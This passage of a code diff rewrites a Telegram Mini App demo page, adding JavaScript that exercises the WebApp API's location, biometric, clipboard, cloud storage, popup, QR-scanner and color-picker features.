+            if (!DemoApp.locationInited) {
+                DemoApp.locationInited = true;
+                Telegram.WebApp.onEvent('locationManagerUpdated', function() {
+                    document.getElementById('loc_inited').textContent = locationManager.isInited ? 'true' : 'false';
+                    document.getElementById('loc_available').textContent = locationManager.isLocationAvailable ? 'true' : 'false';
+                    document.getElementById('loc_access_requested').textContent = locationManager.isAccessRequested ? 'true' : 'false';
+                    document.getElementById('loc_access_granted').textContent = locationManager.isAccessGranted ? 'true' : 'false';
+                    document.getElementById('loc_settings').style.display = (locationManager.isLocationAvailable && locationManager.isAccessRequested && !locationManager.isAccessGranted) ? 'block' : 'none';
+                });
+            }
+            locationManager.init();
+        },
+        locationGet(el) {
+            const locationManager = Telegram.WebApp.LocationManager;
+            if (!locationManager.isInited) {
+                return DemoApp.showAlert('Location not inited yet!');
+            }
+
+            locationManager.getLocation(function(location_data) {
+                const span = el.nextElementSibling;
+                if (location_data) {
+                    span.textContent = '(' + JSON.stringify(location_data) + ')';
+                    span.className = 'ok';
+                } else {
+                    span.textContent = '(Request declined)';
+                    span.className = 'err';
+                }
+            })
+        },
+        locationOpenSettings(el) {
+            const locationManager = Telegram.WebApp.LocationManager;
+            if (!locationManager.isInited) {
+                return DemoApp.showAlert('Location not inited yet!');
+            }
+
+            if (!locationManager.isLocationAvailable || !locationManager.isAccessRequested || locationManager.isAccessGranted) {
+                return false;
+            }
+
+            locationManager.openSettings();
+        },
+
+        // version to string Example: '6.9'
+        doesntSupport(version) {
+            // console.log("version: " + version);
+            // console.log("realVersion: " + this.version());
+            // console.log("doesntSupport: " + this.isVersionAtLeast(version));
+            if (!this.isVersionAtLeast(version)) {
+                Telegram.WebApp.showAlert('This feature is not supported in this version of Telegram', function () {
+                    Telegram.WebApp.close();
+                });
+                throw new Error('This feature is not supported in this version of Telegram');
+            }
+        },
+
+        // actions
+        sendMessage(msg_id, with_webview) {
+            if (!DemoApp.initDataUnsafe.query_id) {
+                alert('WebViewQueryId not defined');
+                return;
+            }
+
+            document.querySelectorAll('button').forEach((btn) => btn.disabled = true);
+
+            const btn       = document.querySelector('#btn_status');
+            btn.textContent = 'Sending...';
+
+            DemoApp.apiRequest('sendMessage', {
+                msg_id      : msg_id || '',
+                with_webview: !DemoApp.initDataUnsafe.receiver && with_webview ? 1 : 0
+            }, function (result) {
+                document.querySelectorAll('button').forEach((btn) => btn.disabled = false);
+
+                if (result.response) {
+                    if (result.response.ok) {
+                        btn.textContent   = 'Message sent successfully!';
+                        btn.className     = 'ok';
+                        btn.style.display = 'block';
+                    } else {
+                        btn.textContent   = result.response.description;
+                        btn.className     = 'err';
+                        btn.style.display = 'block';
+                        alert(result.response.description);
+                    }
+                } else if (result.error) {
+                    btn.textContent   = result.error;
+                    btn.className     = 'err';
+                    btn.style.display = 'block';
+                    alert(result.error);
+                } else {
+                    btn.textContent   = 'Unknown error';
+                    btn.className     = 'err';
+                    btn.style.display = 'block';
+                    alert('Unknown error');
+                }
+            });
+        },
+        changeMenuButton(close) {
+            document.querySelectorAll('button').forEach((btn) => btn.disabled = true);
+            const btnStatus       = document.querySelector('#btn_status');
+            btnStatus.textContent = 'Changing button...';
+
+            DemoApp.apiRequest('changeMenuButton', {}, function (result) {
+                document.querySelectorAll('button').forEach((btn) => btn.disabled = false);
+
+                if (result.response) {
+                    if (result.response.ok) {
+                        btnStatus.textContent   = 'Button changed!';
+                        btnStatus.className     = 'ok';
+                        btnStatus.style.display = 'block';
+                        Telegram.WebApp.close();
+                    } else {
+                        btnStatus.textContent   = result.response.description;
+                        btnStatus.className     = 'err';
+                        btnStatus.style.display = 'block';
+                        alert(result.response.description);
+                    }
+                } else if (result.error) {
+                    btnStatus.textContent   = result.error;
+                    btnStatus.className     = 'err';
+                    btnStatus.style.display = 'block';
+                    alert(result.error);
+                } else {
+                    btnStatus.textContent   = 'Unknown error';
+                    btnStatus.className     = 'err';
+                    btnStatus.style.display = 'block';
+                    alert('Unknown error');
+                }
+            });
+            if (close) {
+                setTimeout(function () {
+                    Telegram.WebApp.close();
+                }, 50);
+            }
+        },
+        checkInitData() {
+            const webViewStatus = document.querySelector('#webview_data_status');
+            if (DemoApp.initDataUnsafe.query_id &&
+                DemoApp.initData &&
+                webViewStatus.classList.contains('status_need')
+            ) {
+                webViewStatus.classList.remove('status_need');
+                DemoApp.apiRequest('checkInitData', {}, function (result) {
+                    if (result.ok) {
+                        webViewStatus.textContent = 'Hash is correct (async)';
+                        webViewStatus.className   = 'ok';
+                    } else {
+                        webViewStatus.textContent = result.error + ' (async)';
+                        webViewStatus.className   = 'err';
+                    }
+                });
+            }
+        },
+        sendText(spam) {
+            const textField = document.querySelector('#text_field');
+            const text      = textField.value;
+            if (!text.length) {
+                return textField.focus();
+            }
+            if (byteLength(text) > 4096) {
+                return alert('Text is too long');
+            }
+
+            const repeat = spam ? 10 : 1;
+            for (let i = 0; i < repeat; i++) {
+                Telegram.WebApp.sendData(text);
+            }
+        },
+        sendTime(spam) {
+            const repeat = spam ? 10 : 1;
+            for (let i = 0; i < repeat; i++) {
+                Telegram.WebApp.sendData(new Date().toString());
+            }
+        },
+        switchInlineQuery(query, chooseChat) {
+            if (chooseChat) {
+                const chatTypes = []
+                const types = ['users', 'bots', 'groups', 'channels'];
+                for (let i = 0; i < types.length; i++) {
+                    const el = document.getElementById('select-' + types[i]);
+                    if (el.checked) {
+                        chatTypes.push(types[i]);
                     }
                 }
 
-			}
-			else{
-				console.log("F");
-			}
-		}
-		api.send();
+                if (!chooseChatTypes.length) {
+                    return DemoApp.showAlert('Select chat types!');
+                }
 
-	
-}
+                Telegram.WebApp.switchInlineQuery(query, chatTypes)
+            }
 
+            Telegram.WebApp.switchInlineQuery(query, false)
+        },
+
+        // Alerts
+        showAlert(message) {
+            Telegram.WebApp.showAlert(message);
+        },
+        showConfirm(message) {
+            Telegram.WebApp.showConfirm(message);
+        },
+        requestContact() {
+            Telegram.WebApp.requestContact(function (result) {
+                if (result) {
+                    DemoApp.showAlert('Contact granted');
+                } else {
+                    DemoApp.showAlert('Contact denied');
+                }
+            });
+        },
+        isVersionAtLeast(version) {
+            return Telegram.WebApp.isVersionAtLeast(version);
+        },
+        showPopup() {
+            Telegram.WebApp.showPopup({
+                title  : 'Popup title',
+                message: 'Popup message',
+                buttons: [
+                    {id: 'delete', type: 'destructive', text: 'Delete all'},
+                    {id: 'faq', type: 'default', text: 'Open FAQ'},
+                    {type: 'cancel'},
+                ]
+            }, function (buttonId) {
+                if (buttonId === 'delete') {
+                    DemoApp.showAlert("'Delete all' selected");
+                } else if (buttonId === 'faq') {
+                    Telegram.WebApp.openLink('https://telegram.org/faq');
+                }
+            });
+        },
+        showScanQrPopup: function (linksOnly) {
+            Telegram.WebApp.showScanQrPopup({
+                text: linksOnly ? 'with any link' : 'for test purposes'
+            }, function (text) {
+                if (linksOnly) {
+                    const lowerText = text.toString().toLowerCase();
+                    if (lowerText.substring(0, 7) === 'http://' ||
+                        lowerText.substring(0, 8) === 'https://'
+                    ) {
+                        setTimeout(function () {
+                            Telegram.WebApp.openLink(text);
+                        }, 50);
+
+                        return true;
+                    }
+                } else {
+                    DemoApp.showAlert(text);
+
+                    return true;
+                }
+            });
+        },
+
+        // Permissions
+        requestLocation(el) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    el.nextElementSibling.innerHTML = '(' + position.coords.latitude + ', ' + position.coords.longitude + ')';
+                    el.nextElementSibling.className = 'ok';
+                });
+            } else {
+                el.nextElementSibling.innerHTML = 'Geolocation is not supported in this browser.';
+                el.nextElementSibling.className = 'err';
+            }
+            return false;
+        },
+        requestVideo(el) {
+            if (navigator.mediaDevices) {
+                navigator.mediaDevices.getUserMedia({audio: false, video: true}).then(function (stream) {
+                    el.nextElementSibling.innerHTML = '(Access granted)';
+                });
+            } else {
+                el.nextElementSibling.innerHTML = 'Media devices is not supported in this browser.';
+                el.nextElementSibling.className = 'err';
+            }
+            return false;
+        },
+        requestAudio(el) {
+            if (navigator.mediaDevices) {
+                navigator.mediaDevices.getUserMedia({audio: true, video: false}).then(function (stream) {
+                    el.nextElementSibling.innerHTML = '(Access granted)';
+                    el.nextElementSibling.className = 'ok';
+                });
+            } else {
+                el.nextElementSibling.innerHTML = 'Media devices is not supported in this browser.';
+                el.nextElementSibling.className = 'err';
+            }
+            return false;
+        },
+        requestAudioVideo(el) {
+            if (navigator.mediaDevices) {
+                navigator.mediaDevices.getUserMedia({audio: true, video: true}).then(function (stream) {
+                    el.nextElementSibling.innerHTML = '(Access granted)';
+                    el.nextElementSibling.className = 'ok';
+                });
+            } else {
+                el.nextElementSibling.innerHTML = 'Media devices is not supported in this browser.';
+                el.nextElementSibling.className = 'err';
+            }
+            return false;
+        },
+        testClipboard(el) {
+            Telegram.WebApp.readTextFromClipboard(function (clipText) {
+                if (clipText === null) {
+                    el.nextElementSibling.innerHTML = 'Clipboard text unavailable.';
+                    el.nextElementSibling.className = 'err';
+                } else {
+                    el.nextElementSibling.innerHTML = '(Read from clipboard: Â«' + clipText + 'Â»)';
+                    el.nextElementSibling.className = 'ok';
+                }
+            });
+            return false;
+        },
+        requestWriteAccess(el) {
+            Telegram.WebApp.requestWriteAccess(function(allowed) {
+                if (allowed) {
+                    el.nextElementSibling.innerHTML = '(Access granted)'
+                    el.nextElementSibling.className = 'ok'
+                } else {
+                    el.nextElementSibling.innerHTML = '(User declined this request)'
+                    el.nextElementSibling.className = 'err'
+                }
+            })
+        },
+        requestPhoneNumber(el) {
+            Telegram.WebApp.requestContact(function(sent, event) {
+                if (sent) {
+                    el.nextElementSibling.innerHTML = '(Phone number sent to the bot' + (event && event.responseUnsafe && event.responseUnsafe.contact && event.responseUnsafe.contact.phone_number ? ': +' + event.responseUnsafe.contact.phone_number : '') + ')'
+                    el.nextElementSibling.className = 'ok'
+                } else {
+                    el.nextElementSibling.innerHTML = '(User declined this request)'
+                    el.nextElementSibling.className = 'err'
+                }
+            })
+        },
+        requestServerTime(el) {
+            Telegram.WebApp.invokeCustomMethod('getCurrentTime', {}, function(err, time) {
+                if (err) {
+                    el.nextElementSibling.innerHTML = '(' + err + ')'
+                    el.nextElementSibling.className = 'err'
+                } else {
+                    el.nextElementSibling.innerHTML = '(' + (new Date(time * 1000)).toString() + ')'
+                    el.nextElementSibling.className = 'ok'
+                }
+            });
+        },
+
+        // cloud storage
+        cloudStorageKeys: {},
+        cloudStorageItems: {},
+        editCloudRow(el, event) {
+            event.preventDefault();
+            const values = DemoApp.cloudStorageItems
+            const key = el.closest('tr').getAttribute('data-key')
+            el.form.reset();
+            el.form.key.value = key;
+            el.form.value.value = values[key];
+        },
+        deleteCloudRow(el, event) {
+            event.preventDefault();
+            const key = el.closest('tr').getAttribute('data-key')
+            Telegram.WebApp.CloudStorage.removeItem(key, function(err, deleted) {
+                if (err) {
+                    DemoApp.showAlert('Error: ' + err);
+                } else {
+                    if (deleted) {
+                        const index = DemoApp.cloudStorageKeys.indexOf(key);
+                        if (index >= 0) {
+                            DemoApp.cloudStorageKeys.splice(index, 1);
+                        }
+                        delete DemoApp.cloudStorageItems[key];
+                    }
+                    el.form.reset();
+                    DemoApp.updateCloudRows();
+                }
+            });
+        },
+        saveCloudForm(form, event) {
+            event.preventDefault();
+            const key = form.key.value
+            const value = form.value.value
+            Telegram.WebApp.CloudStorage.setItem(key, value, function(err, saved) {
+                if (err) {
+                    DemoApp.showAlert('Error: ' + err);
+                } else {
+                    if (saved) {
+                        if (typeof DemoApp.cloudStorageItems[key] === 'undefined') {
+                            DemoApp.cloudStorageKeys.push(key);
+                        }
+                        DemoApp.cloudStorageItems[key] = value;
+                    }
+                    form.reset();
+                    DemoApp.updateCloudRows();
+                }
+            });
+        },
+        updateCloudRows() {
+            let html = '';
+            const keys = DemoApp.cloudStorageKeys;
+            const values = DemoApp.cloudStorageItems;
+            for (let i = 0; i < keys.length; i++) {
+                const key = keys[i];
+                html += '<tr data-key="'+cleanHTML(key)+'"><td>'+cleanHTML(key)+'</td><td>'+cleanHTML(values[key])+'</td><td><button onclick="DemoApp.editCloudRow(this, event);">Edit</button><button onclick="DemoApp.deleteCloudRow(this, event);">Delete</button></td></tr>';
+            }
+
+            document.getElementById('cloud_rows').innerHTML = html
+        },
+        loadCloudKeys(el) {
+            Telegram.WebApp.CloudStorage.getKeys(function(err, keys) {
+                if (err) {
+                    DemoApp.showAlert('Error: ' + err);
+                } else {
+                    if (keys.length > 0) {
+                        Telegram.WebApp.CloudStorage.getItems(keys, function(err, values) {
+                            if (err) {
+                                DemoApp.showAlert('Error: ' + err);
+                            } else {
+                                DemoApp.cloudStorageKeys = keys;
+                                DemoApp.cloudStorageItems = {};
+                                for (let i = 0; i < keys.length; i++) {
+                                    const key = keys[i];
+                                    DemoApp.cloudStorageItems[key] = values[key];
+                                }
+                                DemoApp.updateCloudRows();
+                            }
+                        });
+                    }
+                }
+            });
+        },
+
+        // biometrics
+        biometricInit(el) {
+            const biometricManager = Telegram.WebApp.BiometricManager;
+            if (!DemoApp.biometricInited) {
+                DemoApp.biometricInited = true;
+                Telegram.WebApp.onEvent('biometricManagerUpdated', function() {
+                    document.getElementById('bm_inited').textContent = biometricManager.isInited ? 'true' : 'false'
+                    document.getElementById('bm_available').textContent = biometricManager.isBiometricAvailable ? 'true' : 'false'
+                    document.getElementById('bm_type').textContent = biometricManager.biometricType || ''
+                    document.getElementById('bm_access_requested').textContent = biometricManager.isAccessRequested ? 'true' : 'false'
+                    document.getElementById('bm_access_granted').textContent = biometricManager.isAccessGranted ? 'true' : 'false'
+                    document.getElementById('bm_token_saved').textContent = biometricManager.isBiometricTokenSaved ? 'true' : 'false'
+                    document.getElementById('bm_device_id').textContent = biometricManager.deviceId || ''
+                    document.getElementById('bm_settings').style.display = biometricManager.isBiometricAvailable && biometricManager.isAccessRequested && !biometricManager.isAccessGranted ? 'block' : 'none'
+                });
+            }
+
+            biometricManager.init();
+        },
+        biometricRequestAccess(el) {
+            const biometricManager = Telegram.WebApp.BiometricManager;
+            if (!biometricManager.isInited) {
+                return DemoApp.showAlert('Biometric not inited yet!');
+            }
+
+            biometricManager.requestAccess({reason: 'The bot uses biometrics for testing purposes.'}, function(access_granted) {
+                if (access_granted) {
+                    el.nextElementSibling.innerHTML = '(Access granted)';
+                    el.nextElementSibling.className = 'ok';
+                } else {
+                    el.nextElementSibling.innerHTML = '(Request declined)';
+                    el.nextElementSibling.className = 'err';
+                }
+            });
+        },
+        biometricRequestAuth(el) {
+            const biometricManager = Telegram.WebApp.BiometricManager;
+            if (!biometricManager.isInited) {
+                return DemoApp.showAlert('Biometric not inited yet!');
+            }
+
+            el.nextElementSibling.innerHTML = '';
+            el.nextElementSibling.classList.remove('ok', 'err')
+
+            biometricManager.authenticate({reason: 'The bot requests biometrics for testing purposes.'}, function(success, token) {
+                if (success) {
+                    el.nextElementSibling.innerHTML = '(Success, token: ' + token + ')';
+                    el.nextElementSibling.className = 'ok';
+                } else {
+                    el.nextElementSibling.innerHTML = '(Failed)';
+                    el.nextElementSibling.className = 'err';
+                }
+            });
+        },
+        biometricOpenSettings(el) {
+            const biometricManager = Telegram.WebApp.BiometricManager;
+            if (!biometricManager.isInited) {
+                return DemoApp.showAlert('Biometric not inited yet!');
+            }
+
+            if (!biometricManager.isBiometricAvailable ||
+                !biometricManager.isAccessRequested ||
+                biometricManager.isAccessGranted) {
+                return false;
+            }
+
+            biometricManager.openSettings();
+        },
+        biometricSetToken(el) {
+            const biometricManager = Telegram.WebApp.BiometricManager;
+            if (!biometricManager.isInited) {
+                return DemoApp.showAlert('Biometric not inited yet!');
+            }
+
+            const token = parseInt(Math.random().toString().substring(2)).toString(16);
+            biometricManager.updateBiometricToken(token, function(updated) {
+                if (updated) {
+                    document.getElementById('bm_token_saved').textContent = biometricManager.isBiometricTokenSaved ? 'true' : 'false'
+                    el.nextElementSibling.innerHTML = '(Updated: ' + token + ')'
+                    el.nextElementSibling.className = 'ok'
+                } else {
+                    el.nextElementSibling.innerHTML = '(Failed)'
+                    el.nextElementSibling.className = 'err'
+                }
+            });
+        },
+        biometricRemoveToken(el) {
+            const biometricManager = Telegram.WebApp.BiometricManager;
+            if (!biometricManager.isInited) {
+                return DemoApp.showAlert('Biometric not inited yet!');
+            }
+
+            biometricManager.updateBiometricToken('', function(updated) {
+                if (updated) {
+                    document.getElementById('bm_token_saved').textContent = biometricManager.isBiometricTokenSaved ? 'true' : 'false'
+                    el.nextElementSibling.innerHTML = '(Removed)'
+                    el.nextElementSibling.className = 'ok'
+                } else {
+                    el.nextElementSibling.innerHTML = '(Failed)'
+                    el.nextElementSibling.className = 'err'
+                }
+            });
+        },
+
+        // home screen
+        homeScreenInit() {
+            Telegram.WebApp.onEvent('homeScreenAdded', function(params) {
+                const span = document.getElementById('add_to_home_btn').nextElementSibling;
+                span.textContent = '(added!)';
+                span.className = 'ok';
+            })
+        },
+        addToHomeScreen(el) {
+            Telegram.WebApp.addToHomeScreen()
+        },
+        checkHomeScreenStatus(el) {
+            Telegram.WebApp.checkHomeScreenStatus(function(status) {
+                const span = el.nextElementSibling;
+                span.textContent = '(status: ' + status + ')';
+                span.className = 'ok';
+            })
+        },
+
+        // emoji status
+        emojiStatusInit: function() {
+            Telegram.WebApp.onEvent('emojiStatusFailed', function(params) {
+                DemoApp.showAlert('emojiStatusFailed: ' + params.error);
+            })
+        },
+        setEmojiStatus: function(el, custom_emoji_id, duration) {
+            Telegram.WebApp.setEmojiStatus(custom_emoji_id, duration ? {duration: duration} : {}, function(result) {
+                const span = el.nextElementSibling;
+                if (result) {
+                    span.textContent = '(status set!)';
+                    span.className = 'ok';
+                } else {
+                    span.textContent = '(status NOT set)';
+                    span.className = 'err';
+                }
+            });
+        },
+        requestEmojiStatusAccess: function(el) {
+            Telegram.WebApp.requestEmojiStatusAccess(function(allowed) {
+                const span = el.nextElementSibling;
+                if (allowed) {
+                    span.textContent = '(Access granted)';
+                    span.className = 'ok';
+                } else {
+                    span.textContent = '(User declined this request)';
+                    span.className = 'err';
+                }
+            })
+        },
+
+        // activity
+        activityStartTime: new Date(),
+        activityPrevDuration: false,
+        activityTo: null,
+        activityInit: function() {
+            Telegram.WebApp.onEvent('activated', function(params) {
+                DemoApp.activityStartTime = new Date();
+                DemoApp.activityUpdate();
+            });
+
+            Telegram.WebApp.onEvent('deactivated', function(params) {
+                DemoApp.activityPrevDuration = new Date() - DemoApp.activityStartTime;
+                DemoApp.activityStartTime = false;
+                clearTimeout(DemoApp.activityTo);
+                DemoApp.activityUpdate();
+            });
+
+            DemoApp.activityUpdate();
+        },
+        activityUpdate: function() {
+            const curActivityElement = document.getElementById('cur_activity');
+            const prevActivityElement = document.getElementById('prev_activity');
+
+            if (Telegram.WebApp.isActive) {
+                const nowDuration = new Date() - DemoApp.activityStartTime;
+                curActivityElement.innerHTML = 'Mini App is active for <b>' + Math.round(nowDuration / 1000) + '</b> sec';
+                DemoApp.activityTo = setTimeout(DemoApp.activityUpdate, 100);
+            } else {
+                curActivityElement.innerHTML = 'Mini App is <b>inactive</b>';
+            }
+
+            if (DemoApp.activityPrevDuration !== false) {
+                const prevDuration = DemoApp.activityPrevDuration;
+                prevActivityElement.innerHTML = ', <br>previously was active for <b>' + Math.round(prevDuration / 1000) + '</b> sec';
+            }
+        },
+
+
+        // Other
+        apiRequest(method, data, onCallback) {
+            // DISABLE BACKEND FOR FRONTEND DEMO
+            // YOU CAN USE YOUR OWN REQUESTS TO YOUR OWN BACKEND
+            // CHANGE THIS CODE TO YOUR OWN
+            return onCallback && onCallback({error: 'This function (' + method + ') should send requests to your backend. Please, change this code to your own.'});
+
+            const authData = DemoApp.initData || '';
+            fetch('/demo/api', {
+                method     : 'POST',
+                body       : JSON.stringify(Object.assign(data, {
+                    _auth : authData,
+                    method: method,
+                })),
+                credentials: 'include',
+                headers    : {
+                    'Content-Type': 'application/json'
+                }
+            }).then(function (response) {
+                return response.json();
+            }).then(function (result) {
+                onCallback && onCallback(result);
+            }).catch(function (error) {
+                onCallback && onCallback({error: 'Server error'});
+            });
+        },
+        downloadFile: function(el, url, file_name) {
+            Telegram.WebApp.downloadFile({url: url, file_name: file_name}, function(result) {
+                const span = el.nextElementSibling;
+                if (result) {
+                    span.textContent = '(downloading...)';
+                    span.className = 'ok';
+                } else {
+                    span.textContent = '(declined)';
+                    span.className = 'err';
+                }
+            });
+        },
+    }
+
+    const DemoAppMenu = {
+        init() {
+            DemoApp.init();
+            document.body.classList.add('gray');
+            Telegram.WebApp.setHeaderColor('secondary_bg_color');
+        }
+    };
+
+    const DemoAppInitData = {
+        init() {
+            DemoApp.init();
+            Telegram.WebApp.onEvent('themeChanged', function () {
+                document.getElementById('theme_data').innerHTML = JSON.stringify(Telegram.WebApp.themeParams, null, 2);
+            });
+            document.getElementById('webview_data').innerHTML = JSON.stringify(DemoApp.initDataUnsafe, null, 2);
+            document.getElementById('theme_data').innerHTML   = JSON.stringify(Telegram.WebApp.themeParams, null, 2);
+            DemoApp.checkInitData();
+        }
+    };
+
+    const DemoAppViewport = {
+        init() {
+            DemoApp.init();
+            Telegram.WebApp.onEvent('viewportChanged', DemoAppViewport.setData);
+            DemoAppViewport.setData();
+        },
+        setData() {
+            document.querySelector('.viewport-border').setAttribute('text', window.innerWidth + ' x ' + round(Telegram.WebApp.viewportHeight, 2))
+            document.querySelector('.viewport-stable_border').setAttribute('text', window.innerWidth + ' x ' + round(Telegram.WebApp.viewportStableHeight, 2) +
+                ' | is_expanded: ' + (Telegram.WebApp.isExpanded ? 'true' : 'false'));
+        }
+    }
+
+    function cleanHTML(value) {
+        return value
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/\n/g, '<br/>')
+    }
+
+    function byteLength(str) {
+        if (window.Blob) {
+            try {
+                return new Blob([str]).size;
+            } catch (e) {
+            }
+        }
+
+        let s = str.length;
+        for (let i = str.length - 1; i >= 0; i--) {
+            const code = str.charCodeAt(i);
+            if (code > 0x7f && code <= 0x7ff) {
+                s++;
+            } else if (code > 0x7ff && code <= 0xffff) {
+                s += 2;
+            }
+
+            if (code >= 0xDC00 && code <= 0xDFFF) {
+                i--;
+            }
+        }
+        return s;
+    }
+
+    function round(val, d) {
+        const k = Math.pow(10, d || 0);
+        return Math.round(val * k) / k;
+    }
 </script>
-    </body>
+
+<script type="application/javascript">
+    /*
+     * This part of code is used to initialize the demo app and set up the event handlers we need.
+     */
+
+    Telegram.WebApp.onEvent('themeChanged', function () {
+        document.getElementById('theme_data').innerHTML = JSON.stringify(Telegram.WebApp.themeParams, null, 2);
+    });
+
+    if (DemoApp.initDataUnsafe.query_id) {
+        document.getElementById('main_btn').style.display = 'block';
+    }
+    document.getElementById('with_webview_btn').style.display = !!DemoApp.initDataUnsafe.query_id && !DemoApp.initDataUnsafe.receiver ? 'block' : 'none';
+    document.getElementById('webview_data').innerHTML         = JSON.stringify(DemoApp.initDataUnsafe, null, 2);
+
+    document.getElementById('theme_data').innerHTML = JSON.stringify(Telegram.WebApp.themeParams, null, 2);
+    document.getElementById('regular_link').setAttribute('href', document.getElementById('regular_link').getAttribute('href') + location.hash);
+    document.getElementById('text_field').focus();
+    document.getElementById('regular_field').addEventListener('input', function (e) {
+        const val = this.value.toLowerCase();
+        if (val.indexOf('progress') >= 0) {
+            Telegram.WebApp.MainButton.showProgress();
+        } else {
+            Telegram.WebApp.MainButton.hideProgress();
+        }
+    });
+
+    document.getElementById('ver').innerHTML      = Telegram.WebApp.version;
+    document.getElementById('platform').innerHTML = Telegram.WebApp.platform;
+
+    if (DemoApp.initDataUnsafe.receiver) {
+        document.getElementById('peer_wrap').style.display = 'block';
+        document.getElementById('peer_name').innerHTML     = DemoApp.initDataUnsafe.receiver.first_name + ' ' + DemoApp.initDataUnsafe.receiver.last_name;
+        if (DemoApp.initDataUnsafe.receiver.photo_url) {
+            document.getElementById('peer_photo').setAttribute('src', DemoApp.initDataUnsafe.receiver.photo_url);
+        } else {
+            document.getElementById('peer_photo').style.display = 'none';
+        }
+    } else if (DemoApp.initDataUnsafe.chat) {
+        document.getElementById('peer_wrap').style.display = 'block';
+        document.getElementById('peer_name').innerHTML     = DemoApp.initDataUnsafe.chat.title;
+        if (DemoApp.initDataUnsafe.chat.photo_url) {
+            document.getElementById('peer_photo').setAttribute('src', DemoApp.initDataUnsafe.chat.photo_url);
+        } else {
+            document.getElementById('peer_photo').style.display = 'none';
+        }
+    }
+
+    DemoApp.checkInitData();
+    DemoApp.init();
+
+    function setViewportData() {
+        document.querySelector('.viewport-border').setAttribute('text', window.innerWidth + ' x ' + round(Telegram.WebApp.viewportHeight, 2))
+        document.querySelector('.viewport-stable_border').setAttribute('text', window.innerWidth + ' x ' + round(Telegram.WebApp.viewportStableHeight, 2) +
+            ' | is_expanded: ' + (Telegram.WebApp.isExpanded ? 'true' : 'false'));
+    }
+
+    Telegram.WebApp.setHeaderColor('secondary_bg_color');
+    Telegram.WebApp.onEvent('viewportChanged', setViewportData);
+    setViewportData();
+
+    // bg color picker
+    const bgColorSel = document.getElementById('bg_color_sel')
+    const bgColorInput = document.getElementById('bg_color_input')
+    let prevBgColorValue = bgColorSel.value
+    bgColorInput.value = Telegram.WebApp.backgroundColor
+    document.body.style.setProperty('--bg-color', Telegram.WebApp.backgroundColor)
+
+    bgColorInput.addEventListener('change', function(e) {
+        const color = e.target.value;
+        document.getElementById('bg_color_val').textContent = color;
+        bgColorSel.value = 'custom';
+        prevBgColorValue = bgColorSel.value;
+        Telegram.WebApp.setBackgroundColor(color);
+        document.body.style.setProperty('--bg-color', Telegram.WebApp.backgroundColor);
+    })
+
+    bgColorSel.addEventListener('change', function(e) {
+        const color = e.target.value;
+        if (color === 'custom') {
+            bgColorSel.value = prevBgColorValue;
+            const input = bgColorInput;
+            input.focus();
+            input.click();
+        } else {
+            document.getElementById('bg_color_val').textContent = 'custom...';
+            Telegram.WebApp.setBackgroundColor(color);
+            document.body.style.setProperty('--bg-color', Telegram.WebApp.backgroundColor);
+            bgColorInput.value = Telegram.WebApp.backgroundColor;
+            prevBgColorValue = bgColorSel.value;
+        }
+    })
+
+    // header color picker
+    const headerColorSel = document.getElementById('header_color_sel')
+    const headerColorInput = document.getElementById('header_color_input')
+    let prevHeaderColorValue = headerColorSel.value
+    headerColorInput.value = Telegram.WebApp.headerColor
+    document.body.style.setProperty('--header-color', Telegram.WebApp.headerColor)
+
+    headerColorSel.value = 'secondary_bg_color'
+
+    headerColorInput.addEventListener('change', function(e) {
+        const color = e.target.value;
+        document.getElementById('header_color_val').textContent = color;
+        headerColorSel.value = 'custom';
+        prevHeaderColorValue = headerColorSel.value;
+        Telegram.WebApp.setHeaderColor(color);
+        document.body.style.setProperty('--header-color', Telegram.WebApp.headerColor);
+    })
+
+    headerColorSel.addEventListener('change', function(e) {
+        const color = e.target.value;
+        if (color === 'custom') {
+            headerColorSel.value = prevHeaderColorValue;
+            const input = headerColorInput;
+            input.focus();
+            input.click();
+        } else {
+            document.getElementById('header_color_val').textContent = 'custom...';
+            Telegram.WebApp.setHeaderColor(color);
+            document.getElementById('top_sect').classList.toggle('second', color === 'secondary_bg_color');
+            document.body.style.setProperty('--header-color', Telegram.WebApp.headerColor);
+            headerColorInput.value = Telegram.WebApp.headerColor;
+            prevHeaderColorValue = headerColorSel.value;
+        }
+    })
+
+    // bottom bar color picker
+    const bbarColorSel = document.getElementById('bbar_color_sel')
+    const bbarColorInput = document.getElementById('bbar_color_input')
+    let prevBbarColorValue = bbarColorSel.value;
+    bbarColorInput.value = Telegram.WebApp.bottomBarColor;
+    document.body.style.setProperty('--bottom-bar-color', Telegram.WebApp.bottomBarColor);
+
+    bbarColorInput.addEventListener('change', function(e) {
+        const color = e.target.value;
+        document.getElementById('bbar_color_val').textContent = color;
+        bbarColorSel.value = 'custom';
+        prevBbarColorValue = bbarColorSel.value;
+        Telegram.WebApp.setBottomBarColor(color);
+        document.body.style.setProperty('--bottom-bar-color', Telegram.WebApp.bottomBarColor);
+    })
+
+    bbarColorSel.addEventListener('change', function(e) {
+        const color = e.target.value;
+        if (color === 'custom') {
+            bbarColorSel.value = prevBbarColorValue;
+            const input = bbarColorInput;
+            input.focus();
+            input.click();
+        } else {
+            document.getElementById('bbar_color_val').textContent = 'custom...';
+            Telegram.WebApp.setBottomBarColor(color);
+            document.body.style.setProperty('--bottom-bar-color', Telegram.WebApp.bottomBarColor);
+            bbarColorInput.value = Telegram.WebApp.bottomBarColor;
+            prevBbarColorValue = bbarColorSel.value;
+        }
+    })
+
+    // theme
+    Telegram.WebApp.onEvent('themeChanged', function () {
+        bgColorInput.value = Telegram.WebApp.backgroundColor
+        document.body.setAttribute('style', '--bg-color:' + Telegram.WebApp.backgroundColor)
+    })
+
+    const orientBtn = document.getElementById('orient_btn')
+    if (Telegram.WebApp.isOrientationLocked) {
+        orientBtn.innerHTML = 'Unlock Orientation'
+    } else {
+        orientBtn.innerHTML = 'Lock Orientation'
+    }
+
+    // permissions
+    try {
+        DemoApp.testClipboard(document.getElementById('clipboard_test'));
+    } catch(e) {}
+    try {
+        DemoApp.loadCloudKeys();
+    } catch(e) {}
+    try {
+        DemoApp.biometricInit();
+    } catch(e) {}
+    try {
+        DemoApp.fullscreenInit();
+    } catch(e) {}
+    try {
+        DemoApp.accelerometerInit();
+    } catch(e) {}
+    try {
+        DemoApp.deviceOrientationInit();
+    } catch(e) {}
+    try {
+        DemoApp.gyroscopeInit();
+    } catch(e) {}
+    try {
+        DemoApp.locationInit();
+    } catch(e) {}
+    try {
+        DemoApp.homeScreenInit();
+    } catch(e) {}
+    try {
